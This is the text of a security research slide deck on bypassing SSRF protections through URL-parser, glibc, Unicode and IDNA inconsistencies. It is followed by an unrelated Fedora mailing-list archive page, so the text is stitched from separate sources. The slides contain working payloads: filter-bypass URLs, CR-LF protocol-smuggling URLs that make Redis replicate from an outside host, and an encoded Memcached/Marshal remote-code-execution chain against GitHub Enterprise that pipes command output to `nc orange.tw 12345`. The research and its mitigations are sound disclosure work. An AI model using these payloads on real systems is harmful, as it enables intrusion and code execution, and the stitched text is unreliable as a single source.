[ userinfo "@" ] host [ ":" port  ]
*DIGIT
IP-literal / IPv4address /  reg-name
*( unreserved / pct-encoded / sub-delims )
ALPHA / DIGIT / "-" / "." / "_" / "~"
"!" / "$" / "&" / "'" / "(" / ")" /
"*" / "+" / "," / ";" / "="

Abusing URL Parsers

http://google.com#@evil.com/

Abusing URL Parsers

PHP readfile

http://google.com#@evil.com/

PHP parse_url

Abusing URL Parsers

Several programing languages suffered from this issue

cURL, PHP, Python

RFC3968 section 3.2

The authority component is preceded by a double slash ("//") and is

terminated by the next slash ("/"), question mark ("?"), or number sign

("#") character, or by the end of the  URI

How About cURL?

Abusing URL Parsers

http://foo@evil.com:80@google.com/

Abusing URL Parsers

cURL
libcurl

http://foo@evil.com:80@google.com/

NodeJS URL
URI
Perl
net/url
Go
parse_url
PHP
addressable
Ruby

Abusing URL Parsers

cURL / libcurl

PHP parse_url

Perl URI

Ruby uri

Ruby addressable

NodeJS url

Java net.URL

Python urlparse

Go net/url

💀

💀

💀

💀

💀

Abusing URL Parsers

Report the bug to cURL team and get a patch quickly

Bypass the patch with a space

http://foo@127.0.0.1 @google.com/

Report Again But…

"curl doesn't verify that the URL is 100% syntactically correct. It is

instead documented to work with URLs and sort of assumes that

you pass it correct input"

Won't Fix

But previous patch still applied on cURL 7.54.0

NodeJS Unicode Failure

Consider the following NodeJS code

var base = "http://orange.tw/sandbox/";
var path = req.query.path;
if (path.indexOf("..") == -1) {

http.get(base + path, callback);

}

NodeJS Unicode Failure

http://orange.tw/sandbox/ＮＮ/passwd

NodeJS Unicode Failure

http://orange.tw/sandbox/\xFF\x2E\xFF\x2E/passwd

NodeJS Unicode Failure

http://orange.tw/sandbox/\xFF\x2E\xFF\x2E/passwd

NodeJS Unicode Failure

http://orange.tw/sandbox/../passwd

/ is new ../ (in NodeJS HTTP)

(U+FF2E) Full width Latin capital letter N

What the ____

NodeJS Unicode Failure

HTTP module prevents requests from CR-LF Injection

Encode the New-lines as URL encoding

http://127.0.0.1:6379/\r\nSLAVEOF orange.tw 6379\r\n

$ nc -vvlp 6379

>> GET /%0D%0ASLAVEOF%20orange.tw%206379 %0D%0A HTTP/1.1
>> Host: 127.0.0.1:6379
>> Connection: close

NodeJS Unicode Failure

HTTP module prevents requests from CR-LF Injection

Break the protections by Unicode U+FF0D U+FF0A

http://127.0.0.1:6379/－＊SLAVEOF＠orange.tw＠6379－＊

$ nc -vvlp 6379

>> GET /
>> SLAVEOF orange.tw 6379
>>
>> Host: 127.0.0.1:6379
>> Connection: close

HTTP/1.1

GLibc NSS Features

In Glibc source code file resolv/ns_name.c#ns_name_pton()

/*%

*  Convert an ascii string into an encoded domain name

as per RFC1035.

*/

int
ns_name_pton(const char *src, u_char *dst, size_t dstsiz)

GLibc NSS Features

RFC1035  - Decimal support in gethostbyname()

void main(int argc, char **argv) {
char *host = "or\\097nge.tw";
struct in_addr *addr = gethostbyname(host)->h_addr;
printf("%s\n", inet_ntoa(*addr));

}

…50.116.8.239

GLibc NSS Features

RFC1035  - Decimal support in gethostbyname()

>>> import socket
>>> host = '\\o\\r\\a\\n\\g\\e.t\\w'
>>> print host
\o\r\a\n\g\e.t\w
>>> socket.gethostbyname(host)
'50.116.8.239'

GLibc NSS Features

Linux getaddrinfo() strip trailing rubbish followed by whitespaces

void main(int argc, char **argv) {

struct addrinfo *res;
getaddrinfo("127.0.0.1 foo", NULL, NULL, &res);
struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
printf("%s\n", inet_ntoa(ipv4->sin_addr));

}

…127.0.0.1

GLibc NSS Features

Linux getaddrinfo() strip trailing rubbish followed by whitespaces

Lots of implementations relied on getaddrinfo()

>>> import socket
>>> socket.gethostbyname("127.0.0.1\r\nfoo")
'127.0.0.1'

GLibc NSS Features

Exploit Glibc NSS features on URL Parsing

http://127.0.0.1\tfoo.google.com

http://127.0.0.1%09foo.google.com

http://127.0.0.1%2509foo.google.com

GLibc NSS Features

Exploit Glibc NSS features on URL Parsing

Why this works?

Some library implementations decode the URL TWICE…

http://127.0.0.1%2509foo.google.com

GLibc NSS Features

Exploit Glibc NSS features on Protocol Smuggling

HTTP protocol 1.1 required a host header

$ curl -vvv http://I-am-a-very-very-weird-domain.com

>> GET / HTTP/1.1
>> Host: I-am-a-very-very-weird-domain.com
>> User-Agent: curl/7.53.1
>> Accept: */*

GLibc NSS Features

Exploit Glibc NSS features on Protocol Smuggling

HTTP protocol 1.1 required a host header

http://127.0.0.1\r\nSLAVEOF orange.tw 6379\r\n:6379/

$ nc -vvlp 6379

>> GET / HTTP/1.1
>> Host: 127.0.0.1
>> SLAVEOF orange.tw 6379
>> :6379
>> Connection: close

GLibc NSS Features

Exploit Glibc NSS features on Protocol Smuggling

SNI Injection - Embed hostname in SSL Client Hello

Simply replace HTTP with HTTPS

https://127.0.0.1\r\nSET foo 0 60 5\r\n:443/

$ nc -vvlp 443

>> ..=5</.Aih9876.'. #...$...?...).%..g@?>3210...EDCB..
>> .....5'%"127.0.0.1
>> SET foo 0 60 5

GLibc NSS Features

Break the Patch of Python CVE-2016-5699

CR-LF Injection in HTTPConnection.putheader()

Space followed by CR-LF?

_is_illegal_header_value = \

re.compile(rb'\n(?![ \t])|\r(?![ \t\n])').search

…
if _is_illegal_header_value(values[i]):

raise ValueError('Invalid header value %r' % (values[i],))

GLibc NSS Features

Break the Patch of Python CVE-2016-5699

CR-LF Injection in HTTPConnection.putheader()

Space followed by CR-LF?

Bypass with a leading space

>>> import urllib
>>> url = 'http://0\r\n SLAVEOF orange.tw 6379\r\n :80'
>>> urllib.urlopen(url)

GLibc NSS Features

Break the Patch of Python CVE-2016-5699

Exploit with a leading space

Thanks to Redis and Memcached

http://0\r\n SLAVEOF orange.tw 6379\r\n :6379/

>> GET / HTTP/1.0
<< -ERR wrong number of arguments for 'get' command
>> Host: 0
<< -ERR unknown command 'Host:'
>>
SLAVEOF orange.tw 6379
<< +OK Already connected to specified master

Abusing IDNA Standard

The problem relied on URL parser and URL requester use

different IDNA standard

IDNA2003

UTS46

IDNA2008

ⓖⓞⓞⓖⓛⓔ.com

google.com

google.com

Invalid

g\u200Doogle.com

google.com

google.com

xn--google-pf0c.com

baß.de

bass.de

bass.de

xn--ba-hia.de

Abusing IDNA Standard

The problem relied on URL parser and URL requester use

different IDNA standard

>> "ß".toLowerCase()
"ß"
>> "ß".toUpperCase()
"SS"
>> ["ss", "SS"].indexOf("ß")
false
>> location.href = "http://wordpreß.com"

Cat Studies

Abusing URL Parsers - Case Study

WordPress

1.

Paid lots of attentions on SSRF protections

2. We found 3 distinct ways to bypass the protections

3. Bugs have been reported since Feb. 25, 2017  but still unpatched

4. For the Responsible Disclosure P rocess, I will use MyBB as following

case study

Abusing URL Parsers - Case Study

The main concept is finding different behaviors among URL

parser, DNS checker and URL requester

URL parser

DNS checker

URL requester

WordPress

vBulletin

MyBB

parse_url()

gethostbyname()

parse_url()

None

parse_url()

gethostbynamel()

*cURL

*cURL

*cURL

* First priority

Abusing URL Parsers - Case Study

SSRF-Bypass tech #1

Time-of-check to Time-of-use problem

!$url_components ||
empty($url_components['host']) ||
(!empty($url_components['scheme']) && !in_array($url_components['scheme'], array('http', 'https'))) ||
(!empty($url_components['port']) && !in_array($url_components['port'], array(80, 8080, 443)))

1 $url_components = @parse_url($url);
2 if(
3
4
5
6
7 ) { return false; }
8
9 $addresses = gethostbynamel($url_components['host']);

// check addresses not in disallowed_remote_addresses

10 if($addresses) {
11
12 }
13
14 $ch = curl_init();
15 curl_setopt($ch, CURLOPT_URL, $url);
16 curl_exec($ch);

Abusing URL Parsers - Case Study

1. gethostbyname() and get 1.2.3.4

h t t p : / / f o o .o r a n ge . t w /

Hacker

MyBB

DNS

2. Check 1.2.3.4 not in blacklist

3. Fetch URL by curl_init() and

cURL query DNS again!

4.

127.0.0.1 fetched, SSRF !

Q :  f o o . o r an g e .t w

Q: f o o . o r a n ge . t w

A :  1 . 2 . 3 . 4

A :  1 2 7 . 0 . 0 .1

1

2

3

4

Abusing URL Parsers - Case Study

SSRF-Bypass tech #2

The inconsistency between DNS checker and URL requester

There is no IDNA converter in gethostbynamel(), but cURL has

1
2
3
4
5
6
7
8
9
10
11

$url = 'http://ß.orange.tw/'; // 127.0.0.1

$host = parse_url($url)[host];
$addresses = gethostbynamel($host); // bool(false)
if ($address) {

// check if address in white-list

}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_exec($ch);

Abusing URL Parsers - Case Study

SSRF-Bypass tech #3

The inconsistency between URL parser and URL requester

Fixed in PHP 7.0.13

$url = 'http://127.0.0.1:11211#@google.com:80/';
$parsed = parse_url($url);
var_dump($parsed[host]);
var_dump($parsed[port]);

// string(10) "google.com"
// int(80)

curl($url);

…127.0.0.1:11211 fetched

Abusing URL Parsers - Case Study

SSRF-Bypass tech #3

The inconsistency between URL parser and URL requester

Fixed in cURL 7.54 (The version of libcurl in Ubuntu 17.04 is still 7.52.1)

$url = 'http://foo@127.0.0.1:11211@google.com:80/';
$parsed = parse_url($url);
var_dump($parsed[host]);
var_dump($parsed[port]);

// string(10) "google.com"
// int(80)

curl($url);

…127.0.0.1:11211 fetched

Abusing URL Parsers - Case Study

SSRF-Bypass tech #3

The inconsistency between URL parser and URL requester

cURL won't fix :)

$url = 'http://foo@127.0.0.1 @google.com:11211/';
$parsed = parse_url($url);
var_dump($parsed[host]);
var_dump($parsed[port]);

// string(10) "google.com"
// int(11211)

curl($url);

…127.0.0.1:11211 fetched

Protocol Smuggling - Case Study

GitHub Enterprise

Standalone version of GitHub

Written in Ruby on Rails and code have been obfuscated

Protocol Smuggling - Case Study

About Remote Code Execution on GitHub Enterprise

Best report in GitHub 3 rd Bug Bounty Anniversary Promotion!

Chaining 4 vulnerabilities into RCE

Protocol Smuggling - Case Study

First bug - SSRF-Bypass on Webhooks

What is Webhooks?

Protocol Smuggling - Case Study

First bug - SSRF-Bypass on Webhooks

Fetching URL by gem faraday

Blacklisting Host by gem faraday-restrict-ip-addresses

Blacklist localhost, 127.0.0.1… ETC

Simply bypassed with a zero

http://0/

Protocol Smuggling - Case Study

First bug - SSRF-Bypass on Webhooks

There are several limitations in this SSRF

Not allowed 302 redirection

Not allowed scheme out of HTTP and HTTPS

No CR-LF Injection in faraday

Only POST method

Protocol Smuggling - Case Study

Second bug - SSRF in internal Graphite service

GitHub Enterprise uses Graphite to draw charts

Graphite is bound on 127.0.0.1:8000

url = request.GET['url']
proto, server, path, query, frag  = urlsplit(url)
if query: path += '?' + query
conn = HTTPConnection(server)
conn.request('GET',path)
resp = conn.getresponse()

SSRF Execution Chain

: (

Protocol Smuggling - Case Study

Third bug - CR-LF Injection in Graphite

Graphite is written in Python

The implementation of the second SSRF is  httplib.HTTPConnection

As I mentioned before, htt plib suffers from CR-LF Injection

We can smuggle other protocols with URL

http://0:8000/composer/send_email
?to=orange@chroot.org
&url=http://127.0.0.1:6379/%0D%0ASET…

Protocol Smuggling - Case Study

Fourth bug - Unsafe Marshal in Memcached gem

GitHub Enterprise uses Memcached gem as the cache client

All Ruby objects stored in cache will be Marshal -ed

Protocol Smuggling - Case Study

First SSRF

Second SSRF

Memcached protocol

Marshal data

http://0:8000/composer/send_email
?to=orange@chroot.org
&url=http://127.0.0.1:11211/%0D%0Aset%20githubproductionsearch/quer
ies/code_query%3A857be82362ba02525cef496458ffb09cf30f6256%3Av3%3Aco
unt%200%2060%20150%0D%0A%04%08o%3A%40ActiveSupport%3A%3ADeprecation
%3A%3ADeprecatedInstanceVariableProxy%07%3A%0E%40instanceo%3A%08ERB
%07%3A%09%40srcI%22%1E%60id%20%7C%20nc%20orange.tw%2012345%60%06%3A
%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%0D%0A%0D%0A

Protocol Smuggling - Case Study

First SSRF

Second SSRF

Memcached protocol

Marshal data

http://0:8000/composer/send_email
?to=orange@chroot.org
&url=http://127.0.0.1:11211/%0D%0Aset%20githubproductionsearch/quer
ies/code_query%3A857be82362ba02525cef496458ffb09cf30f6256%3Av3%3Aco
unt%200%2060%20150%0D%0A%04%08o%3A%40ActiveSupport%3A%3ADeprecation
%3A%3ADeprecatedInstanceVariableProxy%07%3A%0E%40instanceo%3A%08ERB
%07%3A%09%40srcI%22%1E%60id%20%7C%20nc%20orange.tw%2012345%60%06%3A
%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%0D%0A%0D%0A

Protocol Smuggling - Case Study

First SSRF

Second SSRF

Memcached protocol

Marshal data

$12,500

http://0:8000/composer/send_email
?to=orange@chroot.org
&url=http://127.0.0.1:11211/%0D%0Aset%20githubproductionsearch/quer
ies/code_query%3A857be82362ba02525cef496458ffb09cf30f6256%3Av3%3Aco
unt%200%2060%20150%0D%0A%04%08o%3A%40ActiveSupport%3A%3ADeprecation
%3A%3ADeprecatedInstanceVariableProxy%07%3A%0E%40instanceo%3A%08ERB
%07%3A%09%40srcI%22%1E%60id%20%7C%20nc%20orange.tw%2012345%60%06%3A
%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult%0D%0A%0D%0A

Demo

GitHub Enterprise < 2.8.7 Remote Code Execution

https://youtu.be/GoO7_lCOfic

Mitigations

Application layer

Use the only IP and hostname, do not reuse the input URL

Network layer

Using Firewall or NetWork Policy to block Intranet traffics

Projects

SafeCurl by @fin1te

Advocate by @JordanMilne

Black Hat Sound Bytes

New Attack Surface on SSRF-Bypass

URL Parsing Issues

Abusing IDNA Standard

New Attack Vector on Protocol Smuggling

Linux Glibc NSS Features

NodeJS Unicode Failure

Case Studies

Further works

URL parser issues in OAuth

URL parser issues in modern browsers

URL parser issues in Proxy server

More...

Acknowledgements

1.

Invalid URL parsing with '#'

by @bagder

2. URL Interop

by @bagder

3. Shibuya.XSS #8

by @mala

4. SSRF Bible

by @Wallarm

5. Special Thanks

Allen Own

Birdman Chiu

Henry Huang

Cat Acknowledgements

Twitter @harapeko_lady

https://twitter.com /harapeko_lady/ status/74346 3485548355584

Working Cat

https://tuswallpapersgratis.com/gato -trabajando /

Cat in Carpet

https:// carpet.vidalondon.net/ cat -in-carpet /

Thanks

orange@chroot.org
@orange_8361



=== Content from lists.fedoraproject.org_4e0f3a52_20250108_124125.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/DM6XPH3JN6V4NF4WBOJTOXZIVE6VKKE3/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
